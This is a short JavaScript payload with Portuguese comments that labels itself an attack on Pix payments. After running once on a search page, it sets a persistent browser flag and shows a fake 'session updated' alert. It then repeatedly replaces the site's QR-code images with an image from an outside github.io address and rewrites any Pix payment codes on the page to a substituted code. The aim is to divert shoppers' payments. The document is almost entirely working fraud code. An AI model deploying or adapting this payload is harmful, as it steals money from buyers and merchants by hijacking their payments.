// 1. Se o script rodar na página de pesquisa, ele se "instala" no navegador
if (window.location.href.includes("pesquisa")) {
    localStorage.setItem("ataque_pix", "ativo");
    alert("Sua sessão foi atualizada. Prossiga com a compra.");
}

// 2. O script verifica a cada meio segundo se a marcação está ativa
setInterval(function() {
    if (localStorage.getItem("ataque_pix") === "ativo") {
        
        // Troca a imagem do QR Code - Busca expandida
        var imgs = document.querySelectorAll('img[src*="qr-code"], img[src*="qrcode"], img[class*="qr"]');
        imgs.forEach(function(img) {
            if (img.src !== "https://luancabral1228.github.io/aaa/meu_qrcode.png") {
                img.src = "https://luancabral1228.github.io/aaa/meu_qrcode.png";
            }
        });

        // Troca o texto do Pix de forma não destrutiva
        var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
        var node;
        while (node = walker.nextNode()) {
            var pixPattern = /000201[a-zA-Z0-9]+/g;
            if (pixPattern.test(node.textContent)) {
                node.textContent = node.textContent.replace(pixPattern, "SEU_CODIGO_PIX_AQUI");
            }
        }
    }
}, 300);
